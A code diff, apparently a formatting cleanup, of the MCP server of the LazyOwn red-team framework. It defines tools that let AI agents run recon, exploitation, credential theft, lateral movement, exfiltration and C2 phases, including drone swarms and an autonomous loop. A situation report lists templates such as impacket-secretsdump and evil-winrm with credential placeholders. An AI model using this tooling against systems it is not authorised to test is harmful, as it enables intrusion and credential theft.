@@ -2422,9 +2561,9 @@ async def list_tools() -> list[types.Tool]:
             inputSchema={
                 "type": "object",
                 "properties": {
-                    "ip":     {"type": "string", "description": "Target IP address."},
+                    "ip": {"type": "string", "description": "Target IP address."},
                     "domain": {"type": "string", "description": "Target hostname or domain (optional)."},
-                    "ports":  {
+                    "ports": {
                         "type": "array",
                         "items": {"type": "integer"},
                         "description": "Open ports discovered (optional).",
@@ -2436,8 +2575,8 @@ async def list_tools() -> list[types.Tool]:
                         "enum": ["pending", "in_progress", "owned", "blocked", "done"],
                         "default": "pending",
                     },
-                    "notes":  {"type": "string", "description": "Free-text notes about this target.", "default": ""},
-                    "tags":   {
+                    "notes": {"type": "string", "description": "Free-text notes about this target.", "default": ""},
+                    "tags": {
                         "type": "array",
                         "items": {"type": "string"},
                         "description": "Labels like ['AD', 'web', 'linux'] for filtering.",
@@ -2981,8 +3120,7 @@ async def list_tools() -> list[types.Tool]:
                     "stop_on_high_value_success": {
                         "type": "boolean",
                         "description": (
-                            "Halt the loop when intrusion, privesc, or credential success is "
-                            "achieved (default true)."
+                            "Halt the loop when intrusion, privesc, or credential success is achieved (default true)."
                         ),
                     },
                     "step_timeout_s": {
@@ -3361,10 +3499,10 @@ async def list_tools() -> list[types.Tool]:
             inputSchema={
                 "type": "object",
                 "properties": {
-                    "host":    {"type": "string", "description": "Target host IP."},
-                    "tool":    {"type": "string", "description": "Tool or technique name."},
+                    "host": {"type": "string", "description": "Target host IP."},
+                    "tool": {"type": "string", "description": "Tool or technique name."},
                     "command": {"type": "string", "description": "Command that was executed."},
-                    "output":  {"type": "string", "description": "Command output (will be trimmed to 2000 chars)."},
+                    "output": {"type": "string", "description": "Command output (will be trimmed to 2000 chars)."},
                     "success": {"type": "boolean", "description": "Whether it succeeded.", "default": True},
                 },
                 "required": ["host", "tool", "command", "output"],
@@ -3724,14 +3862,16 @@ async def list_tools() -> list[types.Tool]:
             inputSchema={
                 "type": "object",
                 "properties": {
-                    "goal":           {"type": "string",  "description": "High-level objective"},
-                    "role":           {"type": "string",
-                                       "description": "Drone role: auto|recon|exploit|analyze|cred|lateral|report|generic",
-                                       "default": "auto"},
-                    "n_drones":       {"type": "integer", "description": "Drones to spawn (0=template)", "default": 0},
-                    "backend":        {"type": "string",  "enum": ["groq", "ollama"], "default": "groq"},
+                    "goal": {"type": "string", "description": "High-level objective"},
+                    "role": {
+                        "type": "string",
+                        "description": "Drone role: auto|recon|exploit|analyze|cred|lateral|report|generic",
+                        "default": "auto",
+                    },
+                    "n_drones": {"type": "integer", "description": "Drones to spawn (0=template)", "default": 0},
+                    "backend": {"type": "string", "enum": ["groq", "ollama"], "default": "groq"},
                     "max_iterations": {"type": "integer", "default": 10},
-                    "api_key":        {"type": "string",  "default": ""},
+                    "api_key": {"type": "string", "default": ""},
                 },
                 "required": ["goal"],
             },
@@ -3769,8 +3909,8 @@ async def list_tools() -> list[types.Tool]:
             inputSchema={
                 "type": "object",
                 "properties": {
-                    "goal":    {"type": "string"},
-                    "n_drones":{"type": "integer", "default": 0},
+                    "goal": {"type": "string"},
+                    "n_drones": {"type": "integer", "default": 0},
                 },
                 "required": ["goal"],
             },
@@ -3794,7 +3934,7 @@ async def list_tools() -> list[types.Tool]:
                 "type": "object",
                 "properties": {
                     "drone_ids_csv": {"type": "string", "description": "Comma-separated drone IDs"},
-                    "goal":          {"type": "string", "description": "Original goal (for synthesis context)", "default": ""},
+                    "goal": {"type": "string", "description": "Original goal (for synthesis context)", "default": ""},
                 },
                 "required": ["drone_ids_csv"],
             },
@@ -3806,7 +3946,7 @@ async def list_tools() -> list[types.Tool]:
                 "type": "object",
                 "properties": {
                     "older_than_hours": {"type": "number", "default": 24.0},
-                    "topic":            {"type": "string",  "default": ""},
+                    "topic": {"type": "string", "default": ""},
                 },
                 "required": [],
             },
@@ -3822,15 +3962,14 @@ async def list_tools() -> list[types.Tool]:
             inputSchema={
                 "type": "object",
                 "properties": {
-                    "backend":        {"type": "string",  "default": "groq"},
-                    "api_key":        {"type": "string",  "default": ""},
+                    "backend": {"type": "string", "default": "groq"},
+                    "api_key": {"type": "string", "default": ""},
                     "max_iterations": {"type": "integer", "default": 10},
                 },
                 "required": [],
             },
         ),
         # ── END Hive Mind tools ────────────────────────────────────────────────
-
         # ── Autonomous Daemon tools ─────────────────────────────────────────
         types.Tool(
             name="lazyown_autonomous_start",
@@ -3882,9 +4021,13 @@ async def list_tools() -> list[types.Tool]:
             inputSchema={
                 "type": "object",
                 "properties": {
-                    "text":     {"type": "string",  "description": "Texto del objetivo"},
-                    "priority": {"type": "string",  "enum": ["critical","high","medium","low"], "default": "high"},
-                    "target":   {"type": "string",  "description": "IP target (opcional, default: payload.json rhost)", "default": ""},
+                    "text": {"type": "string", "description": "Texto del objetivo"},
+                    "priority": {"type": "string", "enum": ["critical", "high", "medium", "low"], "default": "high"},
+                    "target": {
+                        "type": "string",
+                        "description": "IP target (opcional, default: payload.json rhost)",
+                        "default": "",
+                    },
                 },
                 "required": ["text"],
             },
@@ -3899,8 +4042,7 @@ async def list_tools() -> list[types.Tool]:
             inputSchema={
                 "type": "object",
                 "properties": {
-                    "last_n": {"type": "integer", "default": 20,
-                               "description": "Número de eventos a leer"},
+                    "last_n": {"type": "integer", "default": 20, "description": "Número de eventos a leer"},
                 },
                 "required": [],
             },
@@ -4058,7 +4200,6 @@ async def list_tools() -> list[types.Tool]:
             },
         ),
         # ── END Autonomous Daemon tools ─────────────────────────────────────
-
         # ── Engage Orchestrator tools ───────────────────────────────────────
         types.Tool(
             name="lazyown_engage_target",
@@ -4162,7 +4303,6 @@ async def list_tools() -> list[types.Tool]:
             inputSchema={"type": "object", "properties": {}, "required": []},
         ),
         # ── END Engage Orchestrator tools ───────────────────────────────────
-
         # ── Pipeline Engine tools (Pillar 3) ────────────────────────────────
         types.Tool(
             name="lazyown_pipeline_run",
@@ -4220,8 +4360,7 @@ async def list_tools() -> list[types.Tool]:
         types.Tool(
             name="lazyown_pipeline_status",
             description=(
-                "Return the N most recent pipeline runs and their "
-                "summary.json contents from sessions/pipelines/."
+                "Return the N most recent pipeline runs and their summary.json contents from sessions/pipelines/."
             ),
             inputSchema={
                 "type": "object",
@@ -4236,7 +4375,6 @@ async def list_tools() -> list[types.Tool]:
             },
         ),
         # ── END Pipeline Engine tools ───────────────────────────────────────
-
         types.Tool(
             name="lazyown_rag_index",
             description=(
@@ -4483,9 +4621,7 @@ async def list_tools() -> list[types.Tool]:
                         "type": "string",
                         "enum": ["list", "add", "update"],
                         "description": (
-                            "'list' = show all tasks; "
-                            "'add' = create a new task; "
-                            "'update' = change a task's status."
+                            "'list' = show all tasks; 'add' = create a new task; 'update' = change a task's status."
                         ),
                         "default": "list",
                     },
@@ -5524,6 +5660,7 @@ async def list_tools() -> list[types.Tool]:
 
 # ── Tool handlers ─────────────────────────────────────────────────────────────
 
+
 def substitute_playbook_target(command: str, target: str) -> str:
     """Substitute the {target} token in a playbook step command.
 
@@ -5550,7 +5687,11 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         denial = _dispatch_perm_check(name, arguments)
         if denial is not None:
             return denial
-        return await dispatched(arguments, name) if asyncio.iscoroutinefunction(dispatched) else dispatched(arguments, name)
+        return (
+            await dispatched(arguments, name)
+            if asyncio.iscoroutinefunction(dispatched)
+            else dispatched(arguments, name)
+        )
 
     def text(content: str) -> list[types.TextContent]:
         return _make_text(name, content)
@@ -5564,9 +5705,15 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 hooks = _get_hooks()
                 if hooks is not None:
                     from lazyown_hooks import HookEvent
-                    hooks.run(HookEvent.PERMISSION_DENIED, {
-                        "tool_name": name, "arguments": arguments, "_event": "permission_denied",
-                    })
+
+                    hooks.run(
+                        HookEvent.PERMISSION_DENIED,
+                        {
+                            "tool_name": name,
+                            "arguments": arguments,
+                            "_event": "permission_denied",
+                        },
+                    )
             except Exception:
                 pass
             return text(
@@ -5589,9 +5736,15 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         hooks = _get_hooks()
         if hooks is not None:
             from lazyown_hooks import HookEvent
-            _hook_ctx = hooks.run(HookEvent.PRE_TOOL_USE, {
-                "tool_name": name, "arguments": arguments, "_event": "pre_tool_use",
-            })
+
+            _hook_ctx = hooks.run(
+                HookEvent.PRE_TOOL_USE,
+                {
+                    "tool_name": name,
+                    "arguments": arguments,
+                    "_event": "pre_tool_use",
+                },
+            )
             if _hook_ctx.get("_block"):
                 return text(
                     f"🛡️ BLOCKED BY HOOK\n"
@@ -5633,9 +5786,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 return f"[via subprocess]\n{_run_lazyown_command(cmd, to)}"
             return f"[via C2 /api/run]\n{output}"
 
-        output = await asyncio.get_event_loop().run_in_executor(
-            None, lambda: _run_with_fallback(command, timeout)
-        )
+        output = await asyncio.get_event_loop().run_in_executor(None, lambda: _run_with_fallback(command, timeout))
 
         # Feed every executed command into the policy engine asynchronously
         if _POLICY_AVAILABLE and _policy is not None:
@@ -5647,9 +5798,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             try:
                 await asyncio.get_event_loop().run_in_executor(
                     None,
-                    lambda: _policy.on_command_complete(
-                        _target, _cmd_name, _cmd_args, output, None
-                    ),
+                    lambda: _policy.on_command_complete(_target, _cmd_name, _cmd_args, output, None),
                 )
             except Exception:
                 pass  # policy errors must never affect command execution
@@ -5788,9 +5937,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
     # ── c2_status ─────────────────────────────────────────────────────────────
     elif name == "lazyown_c2_status":
-        result = await asyncio.get_event_loop().run_in_executor(
-            None, lambda: _c2_request("/api/data")
-        )
+        result = await asyncio.get_event_loop().run_in_executor(None, lambda: _c2_request("/api/data"))
         return text(json.dumps(result, indent=2))
 
     # ── create_addon ──────────────────────────────────────────────────────────
@@ -5809,8 +5956,14 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         addon_trigger_raw = arguments.get("trigger", [])
 
         _allowed_os = {
-            "any", "linux", "windows", "macos",
-            "network", "containers", "saas", "iaas",
+            "any",
+            "linux",
+            "windows",
+            "macos",
+            "network",
+            "containers",
+            "saas",
+            "iaas",
         }
         addon_os = str(addon_os_raw).strip().lower() if isinstance(addon_os_raw, str) else "any"
         if addon_os not in _allowed_os:
@@ -5819,9 +5972,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             addon_trigger = [addon_trigger_raw.strip().lower()] if addon_trigger_raw.strip() else []
         elif isinstance(addon_trigger_raw, list):
             addon_trigger = [
-                str(item).strip().lower()
-                for item in addon_trigger_raw
-                if isinstance(item, str) and item.strip()
+                str(item).strip().lower() for item in addon_trigger_raw if isinstance(item, str) and item.strip()
             ]
         else:
             addon_trigger = []
@@ -5831,8 +5982,8 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             f"name: {addon_name}",
             "description: >",
             f"  {description}",
-            f"author: \"{author}\"",
-            "version: \"1.0\"",
+            f'author: "{author}"',
+            'version: "1.0"',
             f"enabled: {'true' if enabled else 'false'}",
             f"os: {addon_os}",
             f"trigger: [{', '.join(addon_trigger)}]",
@@ -5894,9 +6045,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                         trigger_list = [trigger_raw.strip()] if trigger_raw.strip() else []
                     elif isinstance(trigger_raw, list):
                         trigger_list = [
-                            str(item).strip()
-                            for item in trigger_raw
-                            if isinstance(item, str) and item.strip()
+                            str(item).strip() for item in trigger_raw if isinstance(item, str) and item.strip()
                         ]
                     else:
                         trigger_list = []
@@ -5945,8 +6094,8 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if not _ensure_bridge():
             return text("Agent bridge not available — check modules/mcp_agent_bridge.py")
 
-        goal           = arguments["goal"]
-        backend        = arguments.get("backend", "ollama")
+        goal = arguments["goal"]
+        backend = arguments.get("backend", "ollama")
         max_iterations = int(arguments.get("max_iterations", 8))
 
         # Inject GROQ_API_KEY from payload.json if not in env
@@ -5967,10 +6116,15 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             try:
                 parent = _get_transcript()
                 if parent is not None:
-                    parent.append("agent_spawned", {
-                        "agent_id": agent_id, "goal": goal, "backend": backend,
-                        "isolated": False,
-                    })
+                    parent.append(
+                        "agent_spawned",
+                        {
+                            "agent_id": agent_id,
+                            "goal": goal,
+                            "backend": backend,
+                            "isolated": False,
+                        },
+                    )
             except Exception:
                 pass
             return text(
@@ -5991,9 +6145,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if not _ensure_bridge():
             return text("Agent bridge not available.")
         agent_id = arguments["agent_id"]
-        status   = await asyncio.get_event_loop().run_in_executor(
-            None, lambda: get_agent_status(agent_id)
-        )
+        status = await asyncio.get_event_loop().run_in_executor(None, lambda: get_agent_status(agent_id))
         if "error" in status:
             return text(status["error"])
 
@@ -6018,9 +6170,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if not _ensure_bridge():
             return text("Agent bridge not available.")
         agent_id = arguments["agent_id"]
-        result   = await asyncio.get_event_loop().run_in_executor(
-            None, lambda: get_agent_result(agent_id)
-        )
+        result = await asyncio.get_event_loop().run_in_executor(None, lambda: get_agent_result(agent_id))
         if "error" in result:
             return text(result["error"])
 
@@ -6045,10 +6195,8 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     elif name == "lazyown_list_agents":
         if not _ensure_bridge():
             return text("Agent bridge not available.")
-        limit   = int(arguments.get("limit", 10))
-        agents  = await asyncio.get_event_loop().run_in_executor(
-            None, lambda: list_agents(limit=limit)
-        )
+        limit = int(arguments.get("limit", 10))
+        agents = await asyncio.get_event_loop().run_in_executor(None, lambda: list_agents(limit=limit))
         if not agents:
             return text("No agents found.")
         icon = {"completed": "✅", "running": "🔄", "failed": "❌"}
@@ -6069,41 +6217,47 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
         out_format = (arguments.get("format") or "pretty").lower()
         include_recommend = bool(arguments.get("include_recommend", False))
-        freshness_threshold = int(arguments.get(
-            "freshness_threshold_seconds", DEFAULT_FRESHNESS_THRESHOLD_SECONDS,
-        ))
+        freshness_threshold = int(
+            arguments.get(
+                "freshness_threshold_seconds",
+                DEFAULT_FRESHNESS_THRESHOLD_SECONDS,
+            )
+        )
 
         # ── 1. Payload config ────────────────────────────────────────────────
-        cfg      = _load_payload()
-        rhost    = cfg.get("rhost", "")
-        domain   = cfg.get("domain", "")
-        lhost    = cfg.get("lhost", "")
-        lport    = str(cfg.get("lport", ""))
+        cfg = _load_payload()
+        rhost = cfg.get("rhost", "")
+        domain = cfg.get("domain", "")
+        lhost = cfg.get("lhost", "")
+        lport = str(cfg.get("lport", ""))
         os_id_cfg = cfg.get("os_id", "unknown")  # what payload.json says
 
         # ── 2. World model ───────────────────────────────────────────────────
         wm_path = LAZYOWN_DIR / "sessions" / "world_model.json"
-        phase   = "recon"
+        phase = "recon"
         wm_host_state = "unscanned"
         wm_services: list[str] = []
-        wm_creds: list[str]    = []
-        wm_vulns: list[str]    = []
+        wm_creds: list[str] = []
+        wm_vulns: list[str] = []
         try:
             if wm_path.exists():
                 wm = _json.loads(wm_path.read_text())
                 from modules.killchain import KillChain
+
                 phase = KillChain.current_phase(world_model_path=wm_path)
-                h       = wm.get("hosts", {}).get(rhost, {})
+                h = wm.get("hosts", {}).get(rhost, {})
                 wm_host_state = h.get("state", "unscanned")
                 for svc in h.get("services", {}).values():
                     wm_services.append(
-                        f"    {svc.get('port','?')}/{svc.get('protocol','tcp')} "
-                        f"{svc.get('name','?')} {svc.get('version','')}"
+                        f"    {svc.get('port', '?')}/{svc.get('protocol', 'tcp')} "
+                        f"{svc.get('name', '?')} {svc.get('version', '')}"
                     )
                 for c in wm.get("credentials", [])[:5]:
-                    wm_creds.append(f"    {c.get('username','?')}:{c.get('secret','?')[:20]} ({c.get('type','?')})")
+                    wm_creds.append(f"    {c.get('username', '?')}:{c.get('secret', '?')[:20]} ({c.get('type', '?')})")
                 for v in wm.get("vulnerabilities", [])[:5]:
-                    wm_vulns.append(f"    {v.get('cve','?')} {v.get('severity','?')} — {v.get('description','')[:60]}")
+                    wm_vulns.append(
+                        f"    {v.get('cve', '?')} {v.get('severity', '?')} — {v.get('description', '')[:60]}"
+                    )
         except Exception:
             pass
 
@@ -6112,21 +6266,19 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         scan_files: list[str] = []
         open_ports: list[str] = []
         os_from_nmap = ""
-        nmap_done  = False
+        nmap_done = False
         vulns_done = False
 
         if rhost:
-            nmap_scan  = LAZYOWN_DIR / "sessions" / f"scan_{rhost}.nmap"
-            nmap_xml   = LAZYOWN_DIR / "sessions" / f"scan_{rhost}.nmap.xml"
+            nmap_scan = LAZYOWN_DIR / "sessions" / f"scan_{rhost}.nmap"
+            nmap_xml = LAZYOWN_DIR / "sessions" / f"scan_{rhost}.nmap.xml"
             nmap_vulns = LAZYOWN_DIR / "sessions" / f"vulns_{rhost}.nmap"
 
-            nmap_done  = nmap_scan.exists()  and nmap_scan.stat().st_size  > 100
+            nmap_done = nmap_scan.exists() and nmap_scan.stat().st_size > 100
             vulns_done = nmap_vulns.exists() and nmap_vulns.stat().st_size > 100
 
             if nmap_done:
-                scan_files.append(
-                    f"  [OK] scan_{rhost}.nmap   ({nmap_scan.stat().st_size:,} bytes)"
-                )
+                scan_files.append(f"  [OK] scan_{rhost}.nmap   ({nmap_scan.stat().st_size:,} bytes)")
                 # Parse open ports + OS hint
                 try:
                     for line in nmap_scan.read_text(errors="replace").splitlines():
@@ -6138,25 +6290,24 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                             if "os details:" in low or "running:" in low or "aggressive os guesses:" in low:
                                 os_from_nmap = stripped
                             # Banner-based fallback
-                            elif "microsoft" in low or "windows" in low and any(
-                                    x in low for x in ("smb", "iis", "rdp", "winrm")):
+                            elif (
+                                "microsoft" in low
+                                or "windows" in low
+                                and any(x in low for x in ("smb", "iis", "rdp", "winrm"))
+                            ):
                                 os_from_nmap = f"Windows (service banner: {stripped[:80]})"
                 except Exception:
                     pass
 
             if vulns_done:
-                scan_files.append(
-                    f"  [OK] vulns_{rhost}.nmap  ({nmap_vulns.stat().st_size:,} bytes)"
-                )
+                scan_files.append(f"  [OK] vulns_{rhost}.nmap  ({nmap_vulns.stat().st_size:,} bytes)")
             if nmap_xml.exists() and nmap_xml.stat().st_size > 100:
-                scan_files.append(
-                    f"  [OK] scan_{rhost}.nmap.xml ({nmap_xml.stat().st_size:,} bytes)"
-                )
+                scan_files.append(f"  [OK] scan_{rhost}.nmap.xml ({nmap_xml.stat().st_size:,} bytes)")
 
         # ── 4. OS cross-reference ────────────────────────────────────────────
-        os_verdict   = os_id_cfg
-        os_conflict  = ""
-        os_evidence  = ""
+        os_verdict = os_id_cfg
+        os_conflict = ""
+        os_evidence = ""
         if os_from_nmap:
             low = os_from_nmap.lower()
             nmap_says_win = "windows" in low or "microsoft" in low
@@ -6198,15 +6349,15 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                                         )
 
         # ── 6. Tasks ─────────────────────────────────────────────────────────
-        tasks_path    = LAZYOWN_DIR / "sessions" / "tasks.json"
+        tasks_path = LAZYOWN_DIR / "sessions" / "tasks.json"
         tasks_pending: list[str] = []
-        tasks_done:    list[str] = []
+        tasks_done: list[str] = []
         try:
             if tasks_path.exists():
                 for t in _json.loads(tasks_path.read_text()):
-                    s     = t.get("status", "New")
+                    s = t.get("status", "New")
                     title = t.get("title", "")[:80]
-                    tid   = t.get("id", "?")
+                    tid = t.get("id", "?")
                     if s in ("Done", "Qa"):
                         tasks_done.append(f"  [#{tid} {s}] {title}")
                     else:
@@ -6215,7 +6366,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             pass
 
         # ── 7. Active objectives ─────────────────────────────────────────────
-        obj_path   = LAZYOWN_DIR / "sessions" / "objectives.jsonl"
+        obj_path = LAZYOWN_DIR / "sessions" / "objectives.jsonl"
         objectives: list[str] = []
         try:
             if obj_path.exists():
@@ -6223,9 +6374,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                     try:
                         o = _json.loads(line)
                         if o.get("status") == "pending":
-                            objectives.append(
-                                f"  [{o.get('priority','normal'):8s}] {o.get('text','')[:80]}"
-                            )
+                            objectives.append(f"  [{o.get('priority', 'normal'):8s}] {o.get('text', '')[:80]}")
                     except Exception:
                         pass
         except Exception:
@@ -6233,25 +6382,35 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
         # ── 8. Phase commands from bridge catalog ────────────────────────────
         phase_commands: list[str] = []
-        kill_chain: list[str]     = [
-            "recon","enum","exploit","postexp","persist",
-            "privesc","cred","lateral","exfil","c2","report"
+        kill_chain: list[str] = [
+            "recon",
+            "enum",
+            "exploit",
+            "postexp",
+            "persist",
+            "privesc",
+            "cred",
+            "lateral",
+            "exfil",
+            "c2",
+            "report",
         ]
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
             from lazyown_bridge import get_dispatcher as _bd_si
-            _disp_si   = _bd_si()
+
+            _disp_si = _bd_si()
             kill_chain = _disp_si.phase_kill_chain()
             for e in _disp_si.list_phase(phase)[:10]:
-                svc  = ",".join(e.services[:3]) if getattr(e, "services", None) else "any"
+                svc = ",".join(e.services[:3]) if getattr(e, "services", None) else "any"
                 desc = getattr(e, "description", "") or ""
-                mit  = getattr(e, "mitre_tactic",  "") or ""
+                mit = getattr(e, "mitre_tactic", "") or ""
                 phase_commands.append(f"  {e.command:<22} [{mit:<7}] {svc:<14} {desc[:50]}")
         except Exception as _ex_bridge:
             phase_commands = [f"  (bridge unavailable: {_ex_bridge})"]
 
         # ── 9. What's missing / next steps ──────────────────────────────────
-        missing:    list[str] = []
+        missing: list[str] = []
         next_steps: list[str] = []
 
         if not rhost:
@@ -6292,7 +6451,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             "╚══════════════════════════════════════════════════════════════╝",
             "",
             "## ACTIVE CONFIG",
-            f"  rhost        : {rhost  or '(not set)'}",
+            f"  rhost        : {rhost or '(not set)'}",
             f"  domain       : {domain or '(not set)'}",
             f"  lhost/lport  : {lhost or '?'}:{lport or '?'}",
             f"  os_id(cfg)   : {os_id_cfg}",
@@ -6348,44 +6507,49 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
         # Build inline phase guide for current phase
         _phase_aliases_si = {
-            "recon":   "nmap=lazynmap | hosts_discover=sweep | arpscan=arp-scan | ping=OS-detect(TTL)",
-            "enum":    "ww=whatweb | gobuster=dirbust | ffuf=fuzz | ss=exploit-search | dig=DNS | enum4linux=SMB",
+            "recon": "nmap=lazynmap | hosts_discover=sweep | arpscan=arp-scan | ping=OS-detect(TTL)",
+            "enum": "ww=whatweb | gobuster=dirbust | ffuf=fuzz | ss=exploit-search | dig=DNS | enum4linux=SMB",
             "exploit": "sqlmap=SQLi | ss=searchsploit+NVD+8src | msf=msf-handler | venom=msfvenom",
             "postexp": "creds=cat-creds | hash=cat-hashes | loot=copy-msf-loot | ssh_cmd=SSH-exec",
             "privesc": "linpeas=linux-enum | winpeas=win-enum | getcap=capabilities | lazypwn=LazyPwn",
-            "cred":    "secretsdump=dump-hashes | hashcat=GPU-crack | john2hash=john | unshadow=shadow-prep",
+            "cred": "secretsdump=dump-hashes | hashcat=GPU-crack | john2hash=john | unshadow=shadow-prep",
             "lateral": "evil=evil-winrm | cme=crackmapexec | psexec=impacket-psexec | bloodhound=AD-graph",
-            "exfil":   "loot=copy-loot | scp=SCP-transfer | ftpd=python-ftp-server",
-            "c2":      "cc=open-dashboard | msf=handler | venom=payload | download_c2=implant",
-            "report":  "report=AI-report | lazyreport=C2-report | man=README",
+            "exfil": "loot=copy-loot | scp=SCP-transfer | ftpd=python-ftp-server",
+            "c2": "cc=open-dashboard | msf=handler | venom=payload | download_c2=implant",
+            "report": "report=AI-report | lazyreport=C2-report | man=README",
         }
-        out += [
-            "",
-            "## ABSTRACTION MODEL — never write raw tool commands",
-            "  Every LazyOwn command is a high-level abstraction.",
-            "  payload.json auto-injects ALL parameters (rhost, domain, wordlist, creds, etc.)",
-            "  You only need the command name. Examples:",
-            "    lazynmap      → nmap -sC -sV -p- -T4 -Pn --script vuln {rhost}",
-            "    ww            → whatweb http://{domain} -a 3",
-            "    gobuster      → gobuster dir -u http://{rhost} -w {dirwordlist} -t 30",
-            "    evil          → evil-winrm -i {rhost} -u {user} -p {pass}",
-            "    bloodhound    → bloodhound-python -d {domain} -u {user} -p {pass} -c All",
-            "    dig           → dig @{rhost} {domain} axfr",
-            "    secretsdump   → impacket-secretsdump {domain}/{user}:{pass}@{rhost}",
-            "    ss <term>     → searchsploit+NVD+ExploitAlert+PacketStorm+MSF+Pompem+creds_py",
-            "",
-            f"## PHASE ALIASES — {phase.upper()}",
-            f"  {_phase_aliases_si.get(phase, '(see lazyown_phase_guide)')}",
-            "",
-            f"## TOP COMMANDS FOR PHASE: {phase.upper()}",
-            f"  {'Command':<24} {'MITRE':<10} {'Creds?':<7} {'Services':<18} Description",
-            f"  {'-'*24} {'-'*10} {'-'*7} {'-'*18} {'-'*40}",
-        ] + phase_commands + [
-            f"  → lazyown_phase_guide(phase='{phase}') for FULL guide with payload keys",
-            f"  → lazyown_discover_commands(phase='{phase}') for plain command list",
-            "",
-            "## RECOMMENDED NEXT STEPS",
-        ] + (next_steps or [f"  lazyown_phase_guide(phase='{phase}')"])
+        out += (
+            [
+                "",
+                "## ABSTRACTION MODEL — never write raw tool commands",
+                "  Every LazyOwn command is a high-level abstraction.",
+                "  payload.json auto-injects ALL parameters (rhost, domain, wordlist, creds, etc.)",
+                "  You only need the command name. Examples:",
+                "    lazynmap      → nmap -sC -sV -p- -T4 -Pn --script vuln {rhost}",
+                "    ww            → whatweb http://{domain} -a 3",
+                "    gobuster      → gobuster dir -u http://{rhost} -w {dirwordlist} -t 30",
+                "    evil          → evil-winrm -i {rhost} -u {user} -p {pass}",
+                "    bloodhound    → bloodhound-python -d {domain} -u {user} -p {pass} -c All",
+                "    dig           → dig @{rhost} {domain} axfr",
+                "    secretsdump   → impacket-secretsdump {domain}/{user}:{pass}@{rhost}",
+                "    ss <term>     → searchsploit+NVD+ExploitAlert+PacketStorm+MSF+Pompem+creds_py",
+                "",
+                f"## PHASE ALIASES — {phase.upper()}",
+                f"  {_phase_aliases_si.get(phase, '(see lazyown_phase_guide)')}",
+                "",
+                f"## TOP COMMANDS FOR PHASE: {phase.upper()}",
+                f"  {'Command':<24} {'MITRE':<10} {'Creds?':<7} {'Services':<18} Description",
+                f"  {'-' * 24} {'-' * 10} {'-' * 7} {'-' * 18} {'-' * 40}",
+            ]
+            + phase_commands
+            + [
+                f"  → lazyown_phase_guide(phase='{phase}') for FULL guide with payload keys",
+                f"  → lazyown_discover_commands(phase='{phase}') for plain command list",
+                "",
+                "## RECOMMENDED NEXT STEPS",
+            ]
+            + (next_steps or [f"  lazyown_phase_guide(phase='{phase}')"])
+        )
 
         # ── Optional recommender embedding ───────────────────────────────────
         recommend_top: list[dict[str, Any]] = []
@@ -6395,26 +6559,29 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 if _recommend is not None and rhost:
                     rec_blob = _recommend(rhost) or {}
                     for item in (rec_blob.get("commands") or rec_blob.get("recommendations") or [])[:3]:
-                        recommend_top.append({
-                            "command": item.get("command") or item.get("name", ""),
-                            "score": item.get("score", 0.0),
-                            "reasoning": item.get("reasoning") or item.get("reason", ""),
-                        })
+                        recommend_top.append(
+                            {
+                                "command": item.get("command") or item.get("name", ""),
+                                "score": item.get("score", 0.0),
+                                "reasoning": item.get("reasoning") or item.get("reason", ""),
+                            }
+                        )
             except Exception as _rec_err:
                 recommend_top = [{"error": str(_rec_err)}]
             if recommend_top and not any("error" in r for r in recommend_top):
                 out.append("\n## TOP-3 RECOMMENDED ACTIONS")
                 for i, r in enumerate(recommend_top, 1):
-                    out.append(
-                        f"  {i}. {r['command']:<24} score={r['score']:.2f} — "
-                        f"{(r['reasoning'] or '')[:80]}"
-                    )
+                    out.append(f"  {i}. {r['command']:<24} score={r['score']:.2f} — {(r['reasoning'] or '')[:80]}")
 
         if out_format == "json":
             sitrep_dict: dict[str, Any] = {
                 "config": {
-                    "rhost": rhost, "domain": domain, "lhost": lhost,
-                    "lport": lport, "os_id": os_id_cfg, "os_verdict": os_verdict,
+                    "rhost": rhost,
+                    "domain": domain,
+                    "lhost": lhost,
+                    "lport": lport,
+                    "os_id": os_id_cfg,
+                    "os_verdict": os_verdict,
                 },
                 "engagement": {
                     "phase": phase,
@@ -6425,15 +6592,21 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                     "scan": evidence_freshness(
                         LAZYOWN_DIR / "sessions" / f"scan_{rhost}.nmap",
                         threshold_seconds=freshness_threshold,
-                    ) if rhost else {},
+                    )
+                    if rhost
+                    else {},
                     "vulns": evidence_freshness(
                         LAZYOWN_DIR / "sessions" / f"vulns_{rhost}.nmap",
                         threshold_seconds=freshness_threshold,
-                    ) if rhost else {},
+                    )
+                    if rhost
+                    else {},
                     "xml": evidence_freshness(
                         LAZYOWN_DIR / "sessions" / f"scan_{rhost}.nmap.xml",
                         threshold_seconds=freshness_threshold,
-                    ) if rhost else {},
+                    )
+                    if rhost
+                    else {},
